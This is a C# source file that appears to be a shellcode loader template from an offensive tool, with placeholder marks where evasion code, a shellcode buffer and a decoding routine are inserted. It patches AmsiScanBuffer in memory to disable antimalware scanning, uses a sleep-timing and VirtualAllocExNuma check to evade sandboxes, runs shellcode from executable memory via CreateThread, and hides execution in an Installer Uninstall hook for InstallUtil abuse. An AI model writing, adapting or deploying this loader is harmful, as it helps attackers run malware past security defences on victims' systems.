using System.Runtime.InteropServices;
using System;
using System.Configuration.Install;
using System.Text;
using System.Diagnostics;

namespace Laicy
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

		[DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        static void cleaning()
        {
            // all credits to https://rastamouse.me/memory-patching-amsi-bypass/
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName == "amsi.dll")
                {
                    hAmsi = module.BaseAddress;
                    Console.WriteLine("Found isma");
                    break;
                }
            }
            if (hAmsi == IntPtr.Zero)
            {
                return;
            }
            else
            {
                var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                var garbage = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

                VirtualProtect(asb, (UIntPtr)garbage.Length, 0x40, out uint oldProtect);

                Marshal.Copy(garbage, 0, asb, garbage.Length);

                VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);

                Console.WriteLine("Patched");
            }
        }
		
		static bool buy_in()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }

            return true;
        }


        public static void Main()
        {

			!!!_AVEVASION_MARK!!!  
			
            !!!_SHELLCODE_MARK!!!
			
			!!!DECODE_ROUTINE!!!
			
            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);
			
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
		[System.ComponentModel.RunInstaller(true)]
		public class Sample : System.Configuration.Install.Installer
		{
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Program.Main();
			}
		}
    }
}